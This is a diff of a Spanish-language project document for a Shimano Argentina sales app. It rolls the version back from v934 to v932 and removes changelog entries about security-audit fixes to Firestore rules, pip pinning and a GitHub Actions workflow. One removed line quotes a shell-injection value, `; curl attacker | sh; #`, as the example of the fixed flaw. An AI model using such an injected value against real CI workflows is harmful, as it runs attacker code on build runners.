@@ -17,8 +17,8 @@ App web para el equipo comercial de **Shimano Argentina** durante la transición
 | **SAP CompanyDB TEST** | `SHIMANO_TST_06` |
 | **Stack** | HTML5 + Vanilla JS + Firebase Firestore + Gemini API (OCR) |
 | **Build pipeline** | Python (openpyxl) genera el HTML autosuficiente desde Excels master |
-| **Versión actual** | **v934 en dev (2026-09-14)** — **SecAudit Sprint 2 batch 2** (2 MEDIUM cerrados): (1) MED-05 `allowed_emails` split `get`/`list` — `get` sigue abierto (login check), `list` restringido a admin/gerente (evita staff directory enum); (2) MED-13 `rendiciones` cerrar el 2-step bypass — `duplicado_detectado` solo puede pasar a `rejected` (antes admin podía escapar via `→ pending_approval → approved`). Sprint 2: 5/15 MEDIUM. MED-07 (snapshots cross-vendor) queda para Sprint 3 — requiere refactor backend. Ver §41. |
-| **APP_VERSION** | `v934` (sincronizada con `sw.js` CACHE_VERSION). Ver §41 Changelog para historial completo. |
+| **Versión actual** | **v932 en prod (2026-09-14)** — cierre del día del 2026-09-14 con **19 versiones shipped** entre trabajo funcional (Claude) y SecAudit Sprint 1 completo (Mariano). Highlights: (a) auto-confirm de pedidos estancados en Pendientes (v921); (b) fix geocoding Google Maps que nunca ejecutaba + fallback Places API (v925); (c) desglose semántico del gap en top-stats TIENDAS (v926); (d) partidos Carmen de Areco + Capitán Sarmiento a Mauricio (v928); (e) SecAudit Sprint 1 **9/9 HIGH cerrados** (v924-v931); (f) UX: tabs Pedidos con color semántico (v923) + iconos SVG en botones del leaflet control (v932). Ver §41. |
+| **APP_VERSION** | `v932` (sincronizada con `sw.js` CACHE_VERSION). Ver §41 Changelog para historial completo. |
 | **Firebase plan** | **Blaze** activo (necesario para Storage + extensions BigQuery) |
 | **Pipeline Power BI** | Firestore → BigQuery (Extension `firestore-bigquery-export`, 7 colecciones + `targets` + `campaigns` via sync propio) + SAP → BigQuery (`sync_sap_to_bigquery.py`, **9 tablas raw**: BPs, Items, Invoices, Credit Notes, Quotations, Orders, POs, **Deliveries**, **Returns**) → **20 vistas curadas** (base: `v_pedidos_header`, `v_pedidos_lines`, `v_visitas` **con `interaction_type`+`es_contacto`+`forma_contacto`**, `v_facturas_sap` **con `paid_to_date`+`saldo_ars`+`assigned_vendor`**, `v_inventario` **con alias `qty_quotations_open`**, `v_inventario_por_warehouse`, `v_ventas_lineas` **con `cobrado_prorrateado_ars`+`deuda_prorrateada_ars`+`assigned_vendor`**, `v_backorder_lineas`, `v_targets` **con `target_reel/canas/lineas_ars`**; **deuda 2026-07-20**: `v_deuda_por_vendedor`, `v_deuda_facturas_detalle`, `v_facturado_cobrado_deuda_por_vendedor`; **rendiciones 2026-07-22**: `v_rendiciones`, `v_rendiciones_duplicados`; **campañas 2026-07-30**: `v_campanias_progreso`, `v_campanias_evolucion_diaria`, `v_campanias_ventas_detalle`; **leads 2026-08-03**: `v_leads_vs_clientes_por_vendedor`; **remitos 2026-08-03/04**: `v_remitos_lineas` con match determinista Delivery↔Invoice `BaseType=13+BaseEntry=Invoice.DocEntry` confirmado por Santi/SEIDOR; **ofertas 2026-08-04**: `v_ofertas_lineas` = total de Sales Quotations sin recortar por stock para card "TOTAL" en PBI) → **Power BI Desktop TABLERO SAR publicado con 8+ páginas (Desempeño-Pesca, Ventas, Pedidos, Visitas, Facturación por vendedor, Backorder, Inventario, Rendiciones, Campañas), slicer de vendedor migrado a `assigned_vendor` (fuente de verdad app, no SlpCode SAP inconsistente)**. Ver sección 40 |
 | **Sync SAP automático** | Service Layer → Firestore + `stock.json` **+ BPs pesca cada 30 min** (cron GH Actions `13,43 * * * *`). Desde v288 sincroniza también BPs con `U_DIVISION ∈ {2 PESCA, 3 BIKE&PESCA}` a `client_applications` — los altas SAP aparecen en la app sin acción manual del admin |
@@ -4670,69 +4670,7 @@ Estos 5 items son la Fase 0 del roadmap detallado en `APP-CONTEXTO.md`. Trabajo 
 
 ---
 
-## 41) Changelog v300 → v934
-
-### v934 (2026-09-14) — SecAudit Sprint 2 batch 2: 2 MEDIUM (allowed_emails get/list split + rendiciones 2-step bypass)
-
-#### MED-05 — `allowed_emails` split `get`/`list` (VULN-208)
-
-`firestore.rules:301+`. Antes: `allow read: if request.auth != null` — cualquier usuario autenticado (incluyendo `unassigned`) podía enumerar el whitelist completo del staff Shimano (dirección de emails de VDE/VDI/admin/gerente/interno). Pretexto ideal para phishing dirigido.
-
-Ahora split:
-- **`get`** (por email como docId): `if request.auth != null` — flow login legítimo (`index.html:21457` y `21646` chequean "estoy en la whitelist?"). No cambia.
-- **`list`** (colección entera): `if isAdminOrGerente()` — panel admin puede seguir listando; unassigned/vendor/viewer/interno ya no pueden enumerar.
-
-#### MED-13 — `rendiciones` cerrar el 2-step bypass duplicado_detectado (VULN-707)
-
-`firestore.rules:407+`. La v857 introdujo un guard que bloqueaba `duplicado_detectado → approved` directo, pero el comment sugería el flow "`duplicado_detectado → pending_approval → approved`" para reactivar falsos positivos. Eso era un bypass documentado en el comment: admin/gerente comprometido podía aprobar rendiciones duplicadas reales en 2 ticks.
-
-El CF detector (`onRendicionCreatedCheckDuplicate`) solo corre `onCreate`, no re-evalúa on update. Cambiar el CF a `onWritten` sería el fix correcto pero requiere backend refactor.
-
-**Fix rules-only Sprint 2**: una vez marcada `duplicado_detectado`, los únicos status transitions permitidos son:
-- `duplicado_detectado → duplicado_detectado` (edición de otros campos, sin cambiar status).
-- `duplicado_detectado → rejected` (admin cancela el doc — audit trail claro).
-
-Para un falso positivo legítimo, el flow correcto es delete + create nueva desde 0 — el CF detector re-evalúa y si no hay duplicado real, queda `pending_approval` normal.
-
-**Tests**: 10 nuevos en `tests/rules/rules.test.js` (5 MED-05 + 5 MED-13). Suite **153/153** ✅ (was 143).
-
-**Sobre MED-07** (`sap_snapshot` / `backorder_snapshot` / `facturacion_snapshot` cross-vendor readable): el fix real requiere re-arquitectura — escribir 1 doc por vendorKey en lugar de un doc global. No apto para Sprint 2 rules-only. Queda para Sprint 3 backend.
-
-**Bump**: APP_VERSION + CACHE_VERSION → `v934`. Deploy: `firebase deploy --only firestore:rules`. Solo rules — no requiere rebuild bundle ni deploy CF.
-
-### v933 (2026-09-14) — SecAudit Sprint 2 batch 1: 3 MEDIUM (counters cap + workflow hardening)
-
-Arranca Sprint 2 (15 MEDIUM del audit). Batch 1 cubre 3 findings de baja complejidad y alto valor.
-
-#### MED-04 — `counters/orderNumber` cap + hasOnly (VULN-207)
-
-`firestore.rules:444+`. Antes: cualquier `isReader()` podía saltar el counter a `Number.MAX_SAFE_INTEGER` (starving legit order numbers) o inyectar campos extra al doc que otros consumers pudieran honrar. Ahora:
-- `create`: `keys().hasOnly(['value','updatedAt','seededAt','seededReason'])` + `value > 0 && value <= 1000000`.
-- `update`: `affectedKeys().hasOnly(['value','updatedAt'])` + `value > resource.data.value && value <= resource.data.value + 1`.
-- El `reserveNextOrderNumber()` (`index.html:14622`) hace exactly `value+1` así que el cap es tight — no rompe el flow legítimo.
-
-**Tests**: 6 nuevos en `tests/rules/rules.test.js` (increment +1 OK, jump a 9999999 DENIED, backtrack DENIED, campos extra en create/update DENIED, docId != 'orderNumber' DENIED). Suite **143/143** ✅ (was 137).
-
-#### MED-08 — `sync-sap-catalog-stock.yml` pin exact pip deps (partial fix, VULN-530)
-
-`.github/workflows/sync-sap-catalog-stock.yml:84+`. El full fix (mover stock.json fuera del repo o usar bot-branch + PR flow con enforce_admins=true) requiere decisión arquitectónica → Sprint 3. Para Sprint 2 hacemos el fix incremental: pin exact versions en el `pip install` para cerrar la superficie **supply chain compromise → admin PAT → push a main bypasseando CI**.
-
-Versiones pinneadas (revisar CVEs + testear en sandbox antes de bumpear):
-- `firebase-admin==6.5.0`
-- `google-cloud-firestore==2.20.1`
-- `google-cloud-core==2.4.1`
-- `google-api-core==2.24.2`
-- `requests==2.32.3`
-
-**Riesgo residual documentado**: el PAT + `contents: write` sigue permitiendo direct push a main. Un actor con acceso al runner de GH Actions puede aún pushear. La superficie del atacante externo (compromising a pip package) queda cerrada por el pinning.
-
-#### MED-10 — `run-pachi-migration.yml` inputs via `env:` (VULN-510)
-
-`.github/workflows/run-pachi-migration.yml:51+`. Antes: `${{ inputs.confirm_apply }}` y `${{ inputs.dry_run }}` interpolados directamente en `run:` — un valor como `; curl attacker | sh; #` ejecutaba shell inyectado en el runner. Ahora ambos inputs pasan por `env:` y se comparan como `"$CONFIRM"` / `"$DRY_RUN"` — shell no expande el contenido como comando.
-
-Trigger es `workflow_dispatch` (solo user con `workflow` scope puede disparar), pero el defense-in-depth reduce blast radius de un actor interno hostil.
-
-**Bump**: APP_VERSION + CACHE_VERSION → `v933`. Solo rules + workflows — no requiere rebuild bundle ni deploy CF. Deploy: `firebase deploy --only firestore:rules`.
+## 41) Changelog v300 → v932
 
 ### 📅 Resumen del día 2026-09-14 (v918 → v932, 19 versiones)
 
